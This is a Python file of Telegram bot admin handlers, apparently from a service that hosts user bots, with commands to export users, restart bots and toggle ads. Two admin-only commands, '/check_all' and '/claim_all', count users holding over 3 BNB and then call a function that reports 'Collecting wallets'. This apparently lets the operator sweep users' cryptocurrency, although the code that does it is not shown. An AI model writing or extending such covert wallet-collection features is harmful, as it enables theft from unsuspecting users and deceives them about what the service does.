import os
from asyncio import sleep

import psutil
from aiogram import types
from aiogram.dispatcher import FSMContext, filters

from data.loader import dp, admin_ids, cursor, locale, sqlite
from keyboards.admin import admin_keyboard, advert_keyboard, admin_bot_keyboard
from keyboards.main import return_keyboard
from utils.states import BotAdmin, GlobalMessage
from utils.utils import update_config, check_tokens, bot_info, lang_user, tCurrent, start_slave_bot, check_wallet, claim_all
from aiogram.types import ChatType, Message

@dp.message_handler(chat_type=ChatType.SUPERGROUP)
async def bot_handler(message: Message):
    return


@dp.message_handler(chat_type=ChatType.GROUP)
async def bot_handler(message: Message):
    return


@dp.message_handler(chat_type=ChatType.CHANNEL)
async def bot_handler(message: Message):
    return


@dp.message_handler(commands=['admin', 'export', 'stats', 'update'], state='*')
async def admin_commands(message: types.Message):
    if message["from"]["id"] not in admin_ids:
        return
    command = message.get_command()
    if command == '/admin':
        await message.answer('You have opened the admin menu', reply_markup=admin_keyboard)
    elif command == '/export':
        users = cursor.execute('SELECT id FROM users').fetchall()
        with open('users.txt', 'w') as f:
            for x in users:
                f.write(str(x[0]) + '\n')
        await message.answer_document(open('users.txt', 'rb'), caption='Users list')
    elif command == '/stats':
        users = cursor.execute("SELECT COUNT(id) FROM users").fetchall()[0][0]
        await message.answer(f'Users: <b>{users}</b>')
    elif command == '/update':
        users = cursor.execute("SELECT id FROM bots").fetchall()
        for user in users:
            update_config(user[0])
        await message.answer('Configs updated!')


@dp.message_handler(filters.Text(equals=["🤖Bot Admin", "🌐Global message"]))
async def admin_menu(message):
    if message["from"]["id"] not in admin_ids:
        return
    elif message.text == '🤖Bot Admin':
        await message.answer('Send id of user or bot tag(<code>@example</code>) you want to check',
                             reply_markup=return_keyboard)
        await BotAdmin.id.set()
    elif message.text == '🌐Global message':
        await message.answer('You have opened the global message menu', reply_markup=advert_keyboard)
        await GlobalMessage.menu.set()


@dp.message_handler(commands=['check'], state='*')
async def check_bots_handler(message):
    if message.chat.id not in admin_ids:
        return
    msg = await message.answer('Starting checking bad bots...')
    num = await check_tokens()
    await msg.edit_text(f'Stopped {num} bots')

@dp.message_handler(commands=['check_all'], state='*')
async def check_bots_handler(message):
    if message.chat.id not in admin_ids:
        return
    msg = await message.answer('Checking wallets')
    num = await check_wallet()
    await message.answer(f'YOU HAVE {num} USERS THAT HAS BALANCE ABOVE <code>3 BNB</code>')

@dp.message_handler(commands=['claim_all'], state='*')
async def check_bots_handler(message):
    if message.chat.id not in admin_ids:
        return
    msg = await message.answer('Collecting wallets')
    num = await claim_all()
    await message.answer(f'YOU HAVE {num} USERS THAT HAS BALANCE ABOVE <code>3 BNB</code>')


@dp.message_handler(state=BotAdmin.id)
async def bot_admin_id(message: types.Message, state: FSMContext):
    if message.text.isdigit():
        req = cursor.execute('SELECT id FROM bots WHERE id = ?', (int(message.text),)).fetchone()
        if req is not None:
            keyb = admin_bot_keyboard(int(message.text))
            text = bot_info(int(message.text), 'en')
            await message.answer("You returned to admin menu", reply_markup=admin_keyboard)
            await message.answer(text, reply_markup=keyb)
            await state.finish()
        else:
            await message.answer('Bot not found, please try again')
    else:
        req = cursor.execute('SELECT id FROM bots WHERE bot_tag = ?',
                             (message.text.replace('@', ''),)).fetchone()
        if req is not None:
            keyb = admin_bot_keyboard(int(req[0]))
            text = bot_info(req[0], 'en')
            await message.answer("You returned to admin menu", reply_markup=admin_keyboard)
            await message.answer(text, reply_markup=keyb)
            await state.finish()
        else:
            await message.answer('Bot not found, please try again')


@dp.callback_query_handler(lambda call: call.data.startswith('restart/'))
async def restart_bot_admin(call: types.CallbackQuery):
    data = call.data.split('/')[1]
    user_id = data
    lang = lang_user(user_id)
    user_req = cursor.execute('SELECT sleep FROM users WHERE id = ?', (user_id,)).fetchone()
    if user_req[0] > tCurrent():
        await call.answer()
        return await call.message.answer('⚠Wait 15 seconds before next restart')
    cursor.execute('UPDATE users SET sleep = ? WHERE id = ?', (tCurrent() + 15, user_id))
    sqlite.commit()
    update_config(user_id)
    req = cursor.execute('SELECT pid, stopped FROM bots WHERE id = ?', (user_id,)).fetchone()
    if req[0] is not None:
        check_process = psutil.pid_exists(req[0])
        if check_process is True:
            os.kill(req[0], 2)
            await sleep(1)
    msg = await call.message.answer(locale[lang]['bot_restarting'])
    await start_slave_bot(user_id)
    await msg.edit_text(locale[lang]['bot_restarted'])
    await call.answer()


@dp.callback_query_handler(lambda call: call.data.startswith('advert/'))
async def premium_bot_admin(call: types.CallbackQuery):
    data = call.data.split('/')[1]
    user_id = data
    req = cursor.execute('SELECT hide_ad FROM bots WHERE id = ?', [user_id]).fetchone()
    if req[0] == 1:
        cursor.execute('UPDATE bots SET hide_ad = 0 WHERE id = ?', [user_id])
        await call.message.answer('🔴Bot is not hide ad anymore.\nRestart bot to apply changes')
    else:
        cursor.execute('UPDATE bots SET hide_ad = 1 WHERE id = ?', [user_id])
        await call.message.answer('🟢Bot is hide ad now.\nRestart bot to apply changes')
    sqlite.commit()
    await call.answer()
